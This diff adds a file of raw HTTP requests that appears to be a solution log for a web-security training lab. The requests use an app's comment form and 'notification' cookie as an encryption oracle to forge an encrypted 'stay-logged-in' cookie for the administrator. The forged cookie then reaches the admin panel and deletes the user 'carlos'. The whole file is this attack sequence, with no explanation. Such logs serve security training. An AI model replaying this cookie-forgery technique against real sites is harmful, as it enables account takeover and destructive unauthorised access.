@@ -1,0 +1,63 @@
+POST /login HTTP/1.1
+Cookie: session=Lrgh9YMfRTA84EqwJvbBGls6K24ml5X9
+
+csrf=86XmBATU8DfGqKK8lI1xkKMqeSrag9FE&username=wiener&password=peter&stay-logged-in=on
+
+GET /my-account HTTP/1.1
+Cookie: session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET / HTTP/1.1
+Cookie: session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET /post?postId=3 HTTP/1.1
+Cookie: session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+POST /post/comment HTTP/1.1
+Cookie: session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+csrf=229OWHJZvV5kOUWsBt7DmP8m3gPn42xf&postId=3&comment=aaaaa&name=aaaaa&email=aaaaa&website=http%3A%2F%2Faaaaa
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU9img7WgdmO5k%2fzXBF%2fucTs%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+POST /post/comment HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU9img7WgdmO5k%2fzXBF%2fucTs%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+csrf=229OWHJZvV5kOUWsBt7DmP8m3gPn42xf&postId=3&comment=aaaaa&name=aaaaa&email=bbbbb&website=http%3A%2F%2Faaaaa
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU%2byV0%2fknsYI%2bFnNx5qVTyaU%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+POST /post/comment HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU9img7WgdmO5k%2fzXBF%2fucTs%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+csrf=229OWHJZvV5kOUWsBt7DmP8m3gPn42xf&postId=3&comment=aaaaa&name=aaaaa&email=administrator%3a1652019998989&website=http%3A%2F%2Faaaaa
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU%2biX8%2fdn2fS7vrZ4IB2FXk1E14MIUAS1rOR8nwmj8xo%2fdnB4TDIgGAkqV63HSxCBGg%3d%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=u762eCAdhV5NRNeDCFAEtazkfJ8Jo/MaP3ZweEwyIBgJKletx0sQgRo%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=u762eCAdhV5NRNeDCFAEtazkfJ8Jo/MaP3ZweEwyIBgJKletx0sQgRo%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+POST /post/comment HTTP/1.1
+Cookie: notification=sKFVds5ADPYQQ9KMkOeeU9img7WgdmO5k%2fzXBF%2fucTs%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+csrf=229OWHJZvV5kOUWsBt7DmP8m3gPn42xf&postId=3&comment=aaaaa&name=aaaaa&email=xxxxxxxxxadministrator%3a1652019998989&website=http%3A%2F%2Faaaaa
+
+GET /post?postId=3 HTTP/1.1
+Cookie: notification=cJuWnsn876DVc57QcWc8KVlNWh53Xr99yEZG4dtx/i8%3d; session=KTDrZEm5fYxzJuJvoPlIRNshNVrsUMpq; stay-logged-in=WrSSVuvSqOeKupT0yEZkhpr2wgtgs0%2fa9%2bTFwROfo0s%3d
+
+GET /my-account HTTP/1.1
+Cookie: session=; stay-logged-in=cJuWnsn876DVc57QcWc8KVlNWh53Xr99yEZG4dtx/i8%3d
+
+GET /admin HTTP/1.1
+Cookie: session=; stay-logged-in=cJuWnsn876DVc57QcWc8KVlNWh53Xr99yEZG4dtx/i8%3d
+
+GET /admin/delete?username=carlos HTTP/1.1
+Cookie: session=; stay-logged-in=cJuWnsn876DVc57QcWc8KVlNWh53Xr99yEZG4dtx/i8%3d
